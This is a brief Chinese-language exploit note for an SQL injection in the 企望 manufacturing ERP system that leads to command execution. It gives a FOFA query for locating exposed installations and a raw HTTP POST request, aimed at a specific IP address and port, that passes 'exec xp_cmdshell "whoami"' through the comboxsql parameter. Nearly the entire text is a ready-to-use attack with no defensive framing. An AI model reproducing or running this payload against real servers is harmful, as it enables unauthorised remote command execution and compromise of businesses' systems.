# 企望制造ERP系统存在 sql 注入导致的命令执行漏洞 

    ## fofa

```
app="企望-ERP系统"
```

## exp

```
POST /mainFunctions/comboxstore.action HTTP/1.1
Host: 110.187.226.220:8093
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip
Content-Length: 35

comboxsql=exec xp_cmdshell+"whoami"
```
